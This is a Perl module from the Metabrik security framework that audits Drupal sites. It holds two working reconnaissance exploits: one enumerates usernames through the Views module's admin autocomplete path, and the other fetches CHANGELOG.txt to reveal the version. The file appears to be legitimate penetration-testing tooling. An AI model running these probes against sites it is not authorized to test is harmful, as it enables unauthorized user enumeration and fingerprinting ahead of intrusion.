#
# $Id: Drupal.pm,v 6bd6acfc81d5 2019/03/13 09:56:26 gomor $
#
# audit::drupal Brik
#
package Metabrik::Audit::Drupal;
use strict;
use warnings;

use base qw(Metabrik::Client::Www);

sub brik_properties {
   return {
      revision => '$Revision: 6bd6acfc81d5 $',
      tags => [ qw(unstable) ],
      author => 'GomoR <GomoR[at]metabrik.org>',
      license => 'http://opensource.org/licenses/BSD-3-Clause',
      attributes => {
         url_path => [ qw(url_path) ],
         target => [ qw(uri) ],
         views_module_chars => [ qw($character_list) ],
      },
      attributes_default => {
         url_path => '/',
         target => 'http://localhost/',
         views_module_chars => [ 'a'..'z' ],
      },
      commands => {
         views_module_info_disclosure => [ qw(target|OPTIONAL url_path|OPTIONAL char_list|OPTIONAL) ],
         core_changelog_txt => [ qw(target|OPTIONAL url_path|OPTIONAL) ],
      },
   };
}

#
# http://www.rapid7.com/db/modules/auxiliary/scanner/http/drupal_views_user_enum
# http://www.madirish.net/node/465
#
sub views_module_info_disclosure {
   my $self = shift;
   my ($target, $url_path, $chars) = @_;

   $target ||= $self->target;
   $url_path ||= $self->url_path;
   $chars ||= $self->views_module_chars;
   $self->brik_help_run_undef_arg('views_module_info_disclosure', $target) or return;
   $self->brik_help_run_undef_arg('views_module_info_disclosure', $url_path) or return;
   $self->brik_help_run_undef_arg('views_module_info_disclosure', $chars) or return;
   my $ref = $self->brik_help_run_undef_arg('views_module_info_disclosure', $chars, 'ARRAY')
      or return;

   my $exploit = '?q=admin/views/ajax/autocomplete/user/';

   $target =~ s/\/*$//;
   $url_path =~ s/^\/*//;

   my @users = ();
   for (@$chars) {
      my $url = $target.'/'.$url_path.$exploit.$_;

      $self->log->info("views_module_info_disclosure: testing url: [$url]");

      my $r = $self->get($url) or next;
      if ($r->{code} == 200) {
         my $decoded = $r->{content};
         push @users, $decoded;
         $self->log->verbose($decoded);
      }
   }

   return \@users;
}

# Gather default information disclosure file
sub core_changelog_txt {
   my $self = shift;
   my ($target, $url_path) = @_;

   $target ||= $self->target;
   $url_path ||= $self->url_path;
   $self->brik_help_run_undef_arg('core_changelog_txt', $target) or return;
   $self->brik_help_run_undef_arg('core_changelog_txt', $url_path) or return;

   my $exploit = 'CHANGELOG.txt';

   $target =~ s/\/*$//;
   $url_path =~ s/^\/*//;

   my $url = $target.'/'.$url_path.$exploit;

   $self->log->verbose("core_changelog_txt: testing url: [$url]");

   my $result = '';

   my $r = $self->get($url) or return;
   if ($r->{code} == 200) {
      $result = $r->{content};
   }

   return $result;
}

1;

__END__

=head1 NAME

Metabrik::Audit::Drupal - audit::drupal Brik

=head1 COPYRIGHT AND LICENSE

Copyright (c) 2014-2019, Patrice E<lt>GomoRE<gt> Auffret

You may distribute this module under the terms of The BSD 3-Clause License.
See LICENSE file in the source distribution archive.

=head1 AUTHOR

Patrice E<lt>GomoRE<gt> Auffret

=cut
